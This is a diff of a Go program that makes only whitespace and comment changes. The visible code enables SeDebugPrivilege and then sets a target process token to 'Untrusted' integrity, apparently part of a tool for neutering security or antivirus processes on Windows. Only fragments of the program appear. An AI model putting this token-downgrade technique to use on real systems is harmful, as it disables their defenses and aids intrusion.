@@ -11,7 +11,7 @@ import (
 )
 
 var (
-		STANDARD_RIGHTS_REQUIRED = 0x000F0000
+	STANDARD_RIGHTS_REQUIRED = 0x000F0000
         STANDARD_RIGHTS_READ = 0x00020000
         TOKEN_ASSIGN_PRIMARY = 0x0001
         TOKEN_DUPLICATE = 0x0002
@@ -23,7 +23,7 @@ var (
         TOKEN_ADJUST_DEFAULT = 0x0080
         TOKEN_ADJUST_SESSIONID = 0x0100
         TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
-		TOKEN_ALL_ACCESS = uint32(STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID)
+	TOKEN_ALL_ACCESS = uint32(STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID)
 	)
 
 const PROCESS_ALL_ACCESS = 0x1F0FFF
@@ -32,7 +32,7 @@ const SE_GROUP_INTEGRITY = 0x00000020
 const UNTRUSTED = "S-1-16-0"
 
 func main() {
-	//Enable  the SeDebugPrivilege on the current process
+	//Enable SeDebugPrivilege on the current process
 	funcs.EnablePrivilegeOnCurrentProcess("SeDebugPrivilege")
 	fmt.Println("[+] SeDebugPrivilege successfully enabled on current process")
 
@@ -63,7 +63,7 @@ func main() {
 	
 	UNTRUSTED_UTF16Ptr := funcs.UTF16PtrFromString(UNTRUSTED)
 	calls.ConvertStringSidToSid(UNTRUSTED_UTF16Ptr, &tml.Label.Sid)
-    tmlSize := uint32(unsafe.Sizeof(tml)) + calls.GetLengthSid(tml.Label.Sid)
+        tmlSize := uint32(unsafe.Sizeof(tml)) + calls.GetLengthSid(tml.Label.Sid)
 
 	err = calls.SetTokenInformation(dTokenHandle, syscall.TokenIntegrityLevel, uintptr(unsafe.Pointer(tml)), tmlSize)
 	if err != nil{
